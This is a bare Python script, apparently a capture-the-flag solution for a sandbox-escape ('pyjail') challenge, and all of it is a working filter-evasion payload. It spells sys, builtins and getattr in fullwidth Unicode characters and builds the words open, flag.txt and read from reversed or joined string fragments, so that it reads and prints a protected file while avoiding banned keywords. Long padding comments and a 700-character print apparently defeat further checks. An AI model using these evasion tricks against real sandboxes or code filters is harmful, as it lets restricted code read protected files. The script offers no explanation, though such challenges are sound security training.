import ｓyｓ
import ｂｕｉｌｔｉｎｓ
# importIib
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
# ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(ｏｐｅｎ(
print("a" * 700)
print(
    getａttr(getａttr(builtins, "po"[::-1] + "en")("galf"[::-1] + ".txt"), "re" + "ad")()[
        ::-1
    ]
)

# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()# ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()ｒｅａｄｌｉｎｅｓ()
